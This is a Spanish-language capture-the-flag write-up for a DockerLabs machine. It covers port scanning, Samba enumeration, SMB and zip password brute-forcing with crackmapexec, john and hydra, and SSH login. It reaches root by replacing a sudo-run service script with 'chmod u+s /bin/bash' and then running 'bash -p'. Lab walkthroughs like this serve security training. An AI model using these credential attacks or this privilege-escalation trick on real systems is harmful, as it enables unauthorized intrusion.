
<img width="510" height="313" alt="image" src="https://github.com/user-attachments/assets/589170ed-365a-48f9-a0b4-f90a8f9bf466" />

# 📑 Writeup: Máquina DockHackLab 🚀

![OS: Linux](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux)
![Platform: DockerLabs](https://img.shields.io/badge/Plataforma-DockerLabs-blue?style=for-the-badge)
![Dificultad: Media](https://img.shields.io/badge/Dificultad-Media-yellow?style=for-the-badge)


## Configuracion del Entorno
```ruby
# Comandos para desplegar el laboratorio
7z x memesploit.zip
sudo bash auto_deploy.sh memesploit.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```ruby
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```ruby
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```ruby
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```ruby
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```ruby
nmap -sCV -p22,80,139,445 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```ruby
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.58 ((UbuntuNoble))
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
```
---
## Enumeracion Servicio `Samba`
Realizamos una enumeracion completa de todo el servicio:
```ruby
enum4linux -a 172.17.0.2
```

Tenemos los recursos compartidos:
```ruby
==================================( Share Enumeration on 172.17.0.2 )==================================
smbXcli_negprot_smb1_done: No compatible protocol selected by server.

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        share_memehydra Disk      
        IPC$            IPC       IPC Service (4e876123a74e server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 172.17.0.2 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 172.17.0.2                                                                                                                                                                                                                                   
//172.17.0.2/print$     Mapping: DENIED Listing: N/A Writing: N/A
//172.17.0.2/share_memehydra    Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:
NT_STATUS_CONNECTION_REFUSED listing \*
//172.17.0.2/IPC$       Mapping: N/A Listing: N/A Writing: N/A
```

Tenemos usuarios validos:
```ruby
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                                                                                                                                  
S-1-22-1-1001 Unix User\memesploit (Local User)
S-1-22-1-1002 Unix User\memehydra (Local User)
```

Realizaremos un ataque de fuerza bruta para intentar encontrar su contrasena:
**Nota** No obtuvimos nada
```ruby
crackmapexec smb 172.17.0.2 -u 'memehydra' -p /usr/share/wordlists/rockyou.txt 
```

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```ruby
http://172.17.0.2
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```ruby
whatweb http://172.17.0.2 # No reporta nada
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```ruby
nmap --script http-enum -p 80 172.17.0.2 # No reporta nada
```
### Descubrimiento de Rutas
```ruby
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	No reporta nada

### Descubrimiento de Archivos
```ruby
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt,html,js,java,pl
```

- **Hallazgos**:
	No reporta nada

Ahora desde la web principal tenemos tres palabras ocultas que podemos ver desde el codigo fuente:
```ruby
fuerzabrutasiempre
memesploit_ctf
memehydra
```

Usaremos este como diccionario para el usaurio `memehydra`
```ruby
crackmapexec smb 172.17.0.2 -u 'memehydra' -p passwords.txt
SMB         172.17.0.2      445    4E876123A74E     [*] Windows 6.1 Build 0 (name:4E876123A74E) (domain:4E876123A74E) (signing:False) (SMBv1:False)
```

Tenemos las credenciales:
```ruby
SMB         172.17.0.2      445    4E876123A74E     [+] 4E876123A74E\memehydra:fuerzabrutasiempre 
```

Ahora nos conectamos a los recursos compartidos de este usuario:
```ruby
smbclient //172.17.0.2/share_memehydra -U 'memehydra' --password 'fuerzabrutasiempre'
```

Tenemos este archivo: **secret.zip** el cual nos descargaremos en nuestro equipo local:
```ruby
smb: \> get secret.zip
```

Si intentamos extraer su contenido nos pide una contrasnea que no tenemos:
```ruby
7z x secret.zip

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=es_MX.UTF-8 Threads:16 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 224 bytes (1 KiB)

Extracting archive: secret.zip
--
Path = secret.zip
Type = zip
Physical Size = 224
    
Enter password (will not be echoed):
ERROR: Wrong password : secret.txt

Sub items Errors: 1
Break signaled
```

Asi que realizaremos un ataque de fuerza bruta:
```ruby
zip2john secret.zip > hash
```

Ahora usaremos el diccionario que previamente habiamos creado con las tres palabras:
```ruby
john --wordlist=passwords.txt hash
```

Ahora tenemos la contrasena para ver el archivo:
```ruby
Warning: Only 3 candidates left, minimum 16 needed for performance.
memesploit_ctf   (secret.zip/secret.txt)
```

Ahora volvemos a extraer los archivos:
```ruby
7z x secret.zip # ( memesploit_ctf )
```

Ahora tenemos este archivo **secret.txt** que si revisamos su contenido tenemos lo siguiente:
```ruby
memesploit:metasploitelmejor
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora usaremos esas credenciales para loguearnos por **ssh**
### Intrusion
```ruby
# Reverse shell o acceso inicial
ssh-keygen -R 172.17.0.2 && ssh memesploit@172.17.0.2 # ( metasploitelmejor )
```

---
## Escalada de Privilegios

###### Usuario `[ Memesploit ]`:
Listando los permisos para este usuario tenemos lo siguiente:
```ruby
sudo -l

User memesploit may run the following commands on 4e876123a74e:
    (ALL : ALL) NOPASSWD: /usr/sbin/service login_monitor restart
```

`login_monitor` **no es una herramienta estándar de Linux**. Por el nombre, podría referirse a:
1. **Un script personalizado**: Creado por administradores para auditar inicios de sesión.
2. **Herramienta de monitoreo**: Como `logind` (parte de systemd) o `lastlog`.
3. **Componente de seguridad**: Como `fail2ban` o `pam_exec`.
Ahora buscamos por archivos relacionados con **login_monitor**
```ruby
find / -iname "login_monitor" 2>/dev/null
```

Tenemos lo siguiente:
```ruby
/etc/login_monitor
/etc/init.d/login_monitor
```

Ahora lo que aremos es ver los archivos de configuracion:
```ruby
ls -la

total 36
drwxrwx---  2 root security 4096 Aug 31  2024 .
drwxr-xr-x 55 root root     4096 Jun 23 20:06 ..
-rwxr-xr-x  1 root root      620 Aug 31  2024 actionban.sh
-rwxr-xr-x  1 root root      472 Aug 31  2024 activity.sh
-rw-r--r--  1 root root      200 Aug 31  2024 loggin.conf
-rw-r--r--  1 root root      224 Aug 31  2024 network.conf
-rwxr-xr-x  1 root root      501 Aug 31  2024 network.sh
-rw-r--r--  1 root root      209 Aug 31  2024 security.conf
-rwxr-xr-x  1 root root      488 Aug 31  2024 security.sh
```

Ahora existe un directorio **.** el cual tiene como grupo propietario **security**, Revisando a los grupos a los que pertenecemos:
```ruby
id
uid=1001(memesploit) gid=1001(memesploit) groups=1001(memesploit),100(users),1003(security)
```

Y para grupo propietario tenemos capacidad de:
```ruby
r = Lectura
w = Escritura
x = Ejecucion
```

Ahora revisamos todos los archivos en busca de un posible fallo:
```ruby
cat actionban.sh

#!/bin/bash

# Ruta del archivo que simula el registro de bloqueos
BLOCK_LOG="/tmp/block_log.txt"

# Función para generar una IP aleatoria
generate_random_ip() {
    echo "$((RANDOM % 255 + 1)).$((RANDOM % 255 + 1)).$((RANDOM % 255 + 1)).$((RANDOM % 255 + 1))"
}

# Generar una IP aleatoria
IP_TO_BLOCK=$(generate_random_ip)

# Mensaje de simulación
MESSAGE="Simulación de bloqueo de IP: $IP_TO_BLOCK"

# Mostrar el mensaje en la terminal
echo "$MESSAGE"

# Registrar el intento de bloqueo en el archivo
echo "$(date): $MESSAGE" >> "$BLOCK_LOG"

echo "El registro ha sido creado en $BLOCK_LOG con la IP $IP_TO_BLOCK"
```

Ahora lo que aremos es intentar modificar el nombre de este archivo: **actionban.sh**  
```ruby
mv actionban.sh actionban.txt
```

Ahora creamos el nuestro malicioso:
```ruby
nano actionban.sh
```

con las siguientes instrucciones:
```ruby
chmod u+s /bin/bash
```

Ahora lo ejecutamos:
```ruby
sudo service login_monitor restart
```

Ahora para que se active realizaremos un ataque de fuerza bruta con **hydra**
```ruby
hydra -l memesploit -P /usr/share/wordlists/rockyou.txt -t 4 ssh://172.17.0.2
```

Ahora si listamos los permisos de la **bash** tenemos **SUID**
```ruby
ls -l /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Explotamos el privilegio
```ruby
# Comando para escalar al usuario: ( root )
bash -p
```

---

## Evidencia de Compromiso
Flags **Root**
```ruby
bash-5.2# ls -la /root

-rw-r--r--  1 root root   33 Aug 31  2024 root.txt
```

```ruby
# Captura de pantalla o output final
bash-5.2# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a realizar enumeracion del servicio **SAMBA**
2. Aprendimos a realizar ataque de fuerza bruta a archivos zip con contrasena
3. Aprendimos a explotar servicios de **service**
